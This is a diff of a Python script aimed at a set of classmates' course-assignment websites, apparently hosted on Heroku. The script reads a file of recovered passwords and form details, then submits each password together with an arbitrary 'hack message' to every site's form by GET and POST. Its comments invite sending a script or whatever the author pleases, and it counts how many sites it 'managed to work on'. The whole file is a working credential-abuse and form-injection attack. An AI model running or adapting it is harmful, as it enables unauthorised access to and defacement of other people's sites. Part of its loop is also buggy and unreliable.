@@ -1,60 +1,88 @@
 import json
 import requests
-import re
-from urllib.request import urlopen
-from bs4 import BeautifulSoup as soup
 
 parsedJSON = 'parsed.json'
 dataParsedJson = {}
-
-# Read JSON data into the data variable
+count = 0
+# Loading JSON data.
 try:
     with open(parsedJSON) as json_file:
         dataParsedJson = json.load(json_file)
 
-        # Going through names of repos in order to access dicts in parsed.json :(
-        ituisReposURL = "https://github.com/ituis18"
+        # We need to send get request to every link in order to make heroku load them.
+        # So we can send the data to all websites at once!
+        for repoData in dataParsedJson.items():
+            try:
+                if repoData['pageLink'] != '':
+                    requests.get(repoData['pageLink'], timeout=5)
+            except requests.exceptions.ReadTimeout as e:
+                print(e)
 
-        # Loop through all the pages
-        for pageNum in range(1, 12):
-            # Open connection, read and close
-            repoPage = urlopen(ituisReposURL + "?page=" + str(pageNum))
-            repoHTML = repoPage.read()
-            repoPage.close()
+        # Going over every key value pair
+        for repo, repoData in dataParsedJson.items():
 
-            # Parse the webpage
-            repoSoup = soup(repoHTML, "html.parser")
-            # Grab all repo names
-            repoNames = repoSoup.findAll("div", {"class": "d-inline-block mb-1"})
+            print('\n')
 
-            for repoName in repoNames:
-                # Find only Assignment 2 repos
-                if repoName.a.text[11:13] == "a2":
-                    # print(repoName.a.text[11:])
-                    # print(repoName)
-                    repoOwnerName = re.findall(r'a2-*.*.', repoName.a.text)[0]
-                    try:
-                        actionLink = dataParsedJson[repoOwnerName]['pageLink'] + dataParsedJson[repoOwnerName]['action']
-                    except KeyError:
-                        try:
-                            actionLink = dataParsedJson[repoOwnerName]['pageLink']
-                            pass
-                        except KeyError:
-                            actionLink = ""
-                            pass
-                    # If password was successfully found
-                    # if dataParsedJson[repoOwnerName]['password'] != "":
-                    try:
-                        requests.post(actionLink,
-                                      data={dataParsedJson[repoOwnerName]['passField']: dataParsedJson[repoOwnerName]['password'],
-                                            'comment': 'Hello'})
-                    except KeyError:
-                        # exitCode = '{} not cracked/found'.format(repoOwnerName)
-                        pass
-                        # print(re.findall(r'a2-*.*.', repoName.a.text)[0])
+            # Gathering data from parsed.json
+            # Checking if the keys do exist or not.
+            try:
+                password = repoData['password']
+            except KeyError:
+                print('Could not find the password of', repo)
+                # Goes to the next iteration of for loop
+                continue
+
+            try:
+                pageLink = repoData['pageLink']
+            except KeyError:
+                print('Could not find the form element of', repo)
+                continue
+
+            try:
+                action = repoData['action']
+            except KeyError:
+                print('Could not find the form element of', repo)
+                continue
+
+            try:
+                passField = repoData['passField']
+                fields = repoData['fields']
+            except KeyError:
+                print('Could not find the pass field of', repo)
+                continue
+
+            if password != '' and pageLink != '':
+                print('Working on {} ( ͡° ͜ʖ ͡°)'.format(repo))
+                # Sets up a parameter that we'll use in post or get method.
+                # passField is the name of the password input password is the password of the repo owner.
+                parameters = {passField: password}
+
+                # For anything other than password input we'll send the script/hack message or whatever we please.
+                hackMessage = 'XDDDDD'
+                for field in fields:
+                    parameters[field] = hackMessage
+
+                # Since we did not check if the repo owners using got or post method we'll send both.
+                # If you are going to send a loaded text message it is better to disable get method.
+                # Because URLs do have a limitation in length.
+                try:
+                    responseGet = requests.get((pageLink + action), params=parameters, timeout=10)
+                    responsePost = requests.post((pageLink + action), data=parameters, timeout=10)
+                    count += 1
+
+                except requests.exceptions.ReadTimeout:
+                    # This error occurs since heroku takes to much time to boot up.
+                    print('ReadTimeout Error occurred while working on', repo)
+                    count -= 1
+                except:
+                    print('Another error!', repo)
+            else:
+                print('Can\'t work on ', repo)
 
 except FileNotFoundError:
     exitCode = '''\"{}\" was not found.
     Have you run the following command\:
     python3 parse.py'''.format(parsedJSON)
     exit(exitCode)
+
+print('Managed to work on {} websites!'.format(count))
